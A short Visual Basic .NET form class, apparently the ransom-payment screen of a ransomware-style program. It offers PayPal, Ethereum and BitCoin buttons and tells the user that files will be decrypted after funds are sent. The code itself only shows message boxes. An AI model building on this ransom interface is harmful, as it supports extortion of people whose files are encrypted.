Public Class Shadow
    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub
    Private Sub Paypal_Click(sender As Object, e As EventArgs) Handles PayPal.Click
        MsgBox("Thank you for choosing PayPal, proceed now.")
    End Sub
    Private Sub Ethereum_Click(sender As Object, e As EventArgs) Handles Ethereum.Click
        MsgBox("Thank you for choosing Ethereum, proceed now.")
    End Sub
    Private Sub BitCoin_Click(sender As Object, e As EventArgs) Handles BitCoin.Click
        MsgBox("Thank you for choosing BitCoin, continue now.")
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        MsgBox("Thank you for sending funds!  Your files will be decrypted shortly!")
    End Sub
End Class
